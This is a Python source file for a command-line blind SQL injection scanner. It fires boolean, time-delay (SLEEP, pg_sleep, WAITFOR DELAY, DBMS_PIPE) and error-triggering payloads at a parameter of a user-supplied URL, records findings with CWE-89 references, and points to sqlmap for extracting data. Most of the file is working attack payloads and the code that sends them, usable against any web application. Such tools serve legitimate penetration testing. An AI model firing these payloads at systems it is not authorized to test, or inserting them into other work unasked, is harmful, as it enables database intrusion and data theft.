#!/usr/bin/env python3
"""blind_sqli.py — Boolean- and time-based blind SQL injection detector.

Detection methods:
  1. Boolean-based differential: TRUE vs FALSE condition, adaptive similarity threshold
  2. Time-based: DB-specific sleep payload with 3-sample median baseline
  3. Error-based: expose DB errors via malformed input (stack traces, syntax errors)
  4. OOB placeholder: logs if DNS/HTTP callback infrastructure is available

Covers MySQL, PostgreSQL, MSSQL, SQLite, Oracle.

    python TOOLS/blind_sqli.py --url "http://127.0.0.1:8901/search?q=test" --param q
    python TOOLS/blind_sqli.py --url http://host/login --param username --method POST
    python TOOLS/blind_sqli.py --url http://host/api --param id --error-only
"""
import argparse
import difflib
import os
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool
from privacy_guard import privacy_user_agent

# ---------------------------------------------------------------------------
# Boolean payloads: (label, true_template, false_template)
# ---------------------------------------------------------------------------
BOOLEAN = [
    # String-context payloads
    ("str-quote",        "{v}' AND '1'='1",           "{v}' AND '1'='2"),
    ("str-comment",      "{v}' AND '1'='1'-- -",      "{v}' AND '1'='2'-- -"),
    ("str-hash",         "{v}' AND '1'='1'#",         "{v}' AND '1'='2'#"),
    ("str-paren",        "{v}') AND ('1'='1",         "{v}') AND ('1'='2"),
    ("str-double-quote", '{v}" AND "1"="1',           '{v}" AND "1"="2'),
    # Numeric-context payloads
    ("num-plain",        "{v} AND 1=1",               "{v} AND 1=2"),
    ("num-comment",      "{v} AND 1=1-- -",           "{v} AND 1=2-- -"),
    ("num-paren",        "{v}) AND (1=1",             "{v}) AND (1=2"),
    # Stacked / OR-based
    ("or-num",           "{v} OR 1=1-- -",            "{v} OR 1=2-- -"),
    # MySQL-specific
    ("mysql-sleep-bool", "{v}' AND SLEEP(0)='0",      "{v}' AND SLEEP(1)='1"),
    # PostgreSQL cast
    ("pg-cast",          "{v}::text AND '1'='1",      "{v}::text AND '1'='2"),
]

# ---------------------------------------------------------------------------
# Time-based payloads: (dialect, template, sleep_seconds_placeholder={s})
# ---------------------------------------------------------------------------
DELAY = 4  # seconds to inject; baseline must be < this
TIME_PAYLOADS = [
    ("mysql",          "{v}' AND SLEEP({s})-- -"),
    ("mysql-dq",       '{v}" AND SLEEP({s})-- -'),
    ("mysql-num",      "{v} AND SLEEP({s})-- -"),
    ("mysql-or",       "{v}' OR SLEEP({s})-- -"),
    ("postgres",       "{v}'; SELECT pg_sleep({s})-- -"),
    ("postgres-cast",  "{v}'::text; SELECT pg_sleep({s})-- -"),
    ("postgres-num",   "{v}; SELECT pg_sleep({s})-- -"),
    ("postgres-and",   "{v}' AND 1=(SELECT 1 FROM pg_sleep({s}))-- -"),
    ("mssql",          "{v}'; WAITFOR DELAY '0:0:{s}'-- -"),
    ("mssql-num",      "{v}; WAITFOR DELAY '0:0:{s}'-- -"),
    ("sqlite",         "{v}' AND randomblob(1000000000/1)='1"),  # CPU burn, no sleep fn
    ("oracle",         "{v}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{s})-- -"),
]

# ---------------------------------------------------------------------------
# Error-based payloads: single quote / type confusion to trigger DB errors
# ---------------------------------------------------------------------------
ERROR_PAYLOADS = [
    ("single-quote",    "{v}'"),
    ("double-quote",    '{v}"'),
    ("backslash",       "{v}\\"),
    ("paren-close",     "{v})"),
    ("pg-cast-error",   "{v}'::int-- -"),
    ("mysql-extractval","{v}' AND extractvalue(1,concat(0x7e,version()))-- -"),
    ("mssql-convert",   "{v}' AND CONVERT(int,@@version)-- -"),
    ("mysql-json",      "{v}' AND JSON_EXTRACT('invalid','$')-- -"),
]

# DB error signatures
ERROR_SIGS = (
    "sql syntax",
    "syntax error",
    "sqlite3",
    "operationalerror",
    "pg::",
    "psycopg",
    "mysql",
    "mariadb",
    "ora-",
    "oracle",
    "unclosed quotation",
    "sqlexception",
    "pdoexception",
    "mssql",
    "microsoft sql",
    "invalid column",
    "unterminated string",
    "conversion failed",
    "division by zero",
    "extractvalue",
    "xpath",
    "dbms_pipe",
    "deadlock",
)


class BlindSQLi(VibeTool):
    def __init__(self):
        super().__init__("Blind SQLi", "Boolean/Time/Error-Based Blind SQL Injection Detector")
        self.findings = 0

    def _send(self, url, param, value, method, extra):
        headers = {
            "User-Agent": privacy_user_agent("Blind SQLi"),
            "Accept": "text/html,application/json,*/*;q=0.9",
        }
        parsed = urllib.parse.urlparse(url)
        q = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        data = dict(extra)
        if method == "GET":
            q[param] = value
            full = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q)))
            body = None
        else:
            data[param] = value
            full = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q)))
            body = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        start = time.perf_counter()
        try:
            req = urllib.request.Request(full, data=body, method=method, headers=headers)
            with urllib.request.urlopen(req, timeout=DELAY + 10) as r:
                return r.getcode(), r.read(80000).decode("utf-8", "replace"), time.perf_counter() - start
        except urllib.error.HTTPError as e:
            return e.code, e.read(80000).decode("utf-8", "replace"), time.perf_counter() - start
        except Exception as e:
            return 0, str(e), time.perf_counter() - start

    @staticmethod
    def _ratio(a: str, b: str) -> float:
        return difflib.SequenceMatcher(None, a, b).ratio()

    def _bool_differential(
        self,
        b_body: str,
        t_body: str,
        f_body: str,
        t_st: int,
        f_st: int,
        b_st: int,
    ) -> bool:
        """
        Adaptive differential: confirm boolean injection only when:
          - TRUE status matches baseline, FALSE does not (or vice-versa)
          - TRUE body is similar to baseline (≥ adaptive threshold)
          - TRUE and FALSE bodies are meaningfully different

        Threshold is adaptive: short responses need a bigger gap to avoid
        false positives from random byte-length variation.
        """
        if t_st == 0 or f_st == 0:
            return False

        r_bt = self._ratio(b_body, t_body)   # baseline vs TRUE
        r_bf = self._ratio(b_body, f_body)   # baseline vs FALSE
        r_tf = self._ratio(t_body, f_body)   # TRUE vs FALSE

        # Short bodies (< 200 chars) are noisy; require a bigger gap
        min_len = min(len(b_body), len(t_body), len(f_body))
        threshold_bt = 0.85 if min_len > 500 else 0.70
        gap_tf = 0.15 if min_len > 500 else 0.25

        # Pattern 1: TRUE ≈ baseline, FALSE ≠ baseline (normal true/false diverge)
        if t_st == b_st and r_bt >= threshold_bt and (r_bt - r_tf) >= gap_tf:
            return True

        # Pattern 2: Status-code differential alone (some apps return 200 vs 500)
        if t_st != f_st and t_st == b_st and f_st >= 500:
            return True

        # Pattern 3: Significant length differential with same status
        if t_st == f_st == b_st:
            lt, lf, lb = len(t_body), len(f_body), len(b_body)
            if lt > 0 and lf > 0 and lb > 0:
                # TRUE close to baseline length, FALSE differs by >30%
                if abs(lt - lb) / lb < 0.10 and abs(lf - lt) / max(lt, 1) > 0.30:
                    return True

        return False

    def _time_baseline(self, url, param, value, method, extra, samples=3) -> float:
        """3-sample median baseline latency to reduce timing noise."""
        lats = []
        for _ in range(samples):
            _, _, lat = self._send(url, param, value, method, extra)
            lats.append(lat)
        return statistics.median(lats)

    def _check_error_sigs(self, body: str) -> str | None:
        """Return first matched DB error signature, or None."""
        low = body.lower()
        for sig in ERROR_SIGS:
            if sig in low:
                return sig
        return None

    def run(self, url, param, value, method, extra, error_only=False):
        self.banner()
        self.log(f"Target: {url}  param={param!r}  method={method}")

        b_st, b_body, b_lat = self._send(url, param, value, method, extra)
        if b_st == 0:
            self.log(f"Baseline failed: {b_body}", "fail")
            return 2
        self.log(
            f"Baseline: status={b_st} len={len(b_body)} lat={b_lat * 1000:.0f}ms"
        )

        # ------------------------------------------------------------------
        # ERROR-BASED detection
        # ------------------------------------------------------------------
        self.log("=== ERROR-BASED ===")
        for label, tpl in ERROR_PAYLOADS:
            payload_val = tpl.format(v=value)
            st, body, _ = self._send(url, param, payload_val, method, extra)
            sig = self._check_error_sigs(body or "")
            if sig:
                self.log(
                    f"ERROR-BASED SQLi CONFIRMED via {label}: "
                    f"DB signature '{sig}' in response (HTTP {st})",
                    "hack",
                )
                self.record_finding(
                    title=f"Error-Based SQL Injection ({label})",
                    severity="critical",
                    location=url,
                    evidence=f"Payload: {payload_val!r} → DB error signature '{sig}' in HTTP {st} response.",
                    recommendation="Use parameterized queries / prepared statements. Never return raw DB errors.",
                    cwe="CWE-89",
                    owasp="A03:2021-Injection",
                )
                self.findings += 1

        if error_only:
            self._final_summary()
            return 0

        # ------------------------------------------------------------------
        # BOOLEAN-BASED detection
        # ------------------------------------------------------------------
        self.log("=== BOOLEAN-BASED ===")
        for label, tpl_t, tpl_f in BOOLEAN:
            t_st, t_body, _ = self._send(url, param, tpl_t.format(v=value), method, extra)
            f_st, f_body, _ = self._send(url, param, tpl_f.format(v=value), method, extra)
            confirmed = self._bool_differential(b_body, t_body, f_body, t_st, f_st, b_st)
            if confirmed:
                r_tf = self._ratio(t_body, f_body)
                self.log(
                    f"BLIND SQLi (boolean) CONFIRMED via {label}: "
                    f"TRUE≈baseline  TRUE/FALSE_ratio={r_tf:.2f}",
                    "hack",
                )
                self.record_finding(
                    title=f"Boolean-Based Blind SQL Injection ({label})",
                    severity="critical",
                    location=url,
                    evidence=(
                        f"TRUE payload: {tpl_t.format(v=value)!r}\n"
                        f"FALSE payload: {tpl_f.format(v=value)!r}\n"
                        f"TRUE/FALSE response similarity: {r_tf:.2f}"
                    ),
                    recommendation="Use parameterized queries. Sanitize and validate all user input.",
                    cwe="CWE-89",
                    owasp="A03:2021-Injection",
                )
                self.findings += 1
            else:
                r_bt = self._ratio(b_body, t_body)
                r_tf = self._ratio(t_body, f_body)
                self.log(f"  {label}: no differential (bt={r_bt:.2f} tf={r_tf:.2f})", "info")

        # ------------------------------------------------------------------
        # TIME-BASED detection
        # ------------------------------------------------------------------
        self.log("=== TIME-BASED ===")
        base_lat = self._time_baseline(url, param, value, method, extra)
        self.log(f"Time baseline (3-sample median): {base_lat * 1000:.0f}ms")

        for dialect, tpl in TIME_PAYLOADS:
            payload_val = tpl.format(v=value, s=DELAY)
            st, _, lat = self._send(url, param, payload_val, method, extra)
            delta = lat - base_lat
            # Confirm only if stall is at least 70% of injected delay
            if lat >= base_lat + DELAY * 0.70:
                self.log(
                    f"BLIND SQLi (time) CONFIRMED via {dialect}: "
                    f"stall +{delta:.1f}s over {base_lat * 1000:.0f}ms baseline",
                    "hack",
                )
                self.record_finding(
                    title=f"Time-Based Blind SQL Injection ({dialect})",
                    severity="critical",
                    location=url,
                    evidence=(
                        f"Payload: {payload_val!r}\n"
                        f"Response latency: {lat:.2f}s (baseline: {base_lat:.2f}s, injected delay: {DELAY}s)"
                    ),
                    recommendation="Use parameterized queries. Never interpolate user input into SQL strings.",
                    cwe="CWE-89",
                    owasp="A03:2021-Injection",
                )
                self.findings += 1
            else:
                self.log(f"  {dialect}: no delay (+{delta * 1000:.0f}ms)", "info")

        self._final_summary()
        return 0

    def _final_summary(self):
        self.log("=" * 48)
        if self.findings:
            self.log(
                f"BLIND SQLi COMPLETE — {self.findings} confirmed injection channel(s). "
                "Use sqlmap --technique=BT with confirmed param for data extraction.",
                "hack",
            )
        else:
            self.log("No blind SQL injection detected on tested vectors.", "pass")


def main(argv=None):
    p = argparse.ArgumentParser(
        description="Blind SQLi — boolean/time/error-based blind SQL injection detector"
    )
    p.add_argument("--url", required=True, help="Target URL (include param in URL for GET, e.g. http://host/search?q=x)")
    p.add_argument("--param", required=True, help="Parameter name to inject into")
    p.add_argument("--value", default="", help="Baseline parameter value (default: auto-detected from URL)")
    p.add_argument("--method", choices=("GET", "POST"), default="GET")
    p.add_argument("--data", default="", help="Additional POST body fields (key=val&key2=val2)")
    p.add_argument("--error-only", action="store_true", help="Run only error-based detection (fast)")
    p.add_argument("--delay", type=int, default=4, help="Time-injection sleep seconds (default 4)")
    p.add_argument("-v", "--version", action="version", version="Blind SQLi 2.0.0")
    args = p.parse_args(argv)

    global DELAY
    DELAY = args.delay

    value = args.value or dict(
        urllib.parse.parse_qsl(urllib.parse.urlparse(args.url).query)
    ).get(args.param, "1")
    extra = dict(urllib.parse.parse_qsl(args.data)) if args.data else {}
    return BlindSQLi().run(args.url, args.param, value, args.method, extra, error_only=args.error_only)


if __name__ == "__main__":
    sys.exit(main())
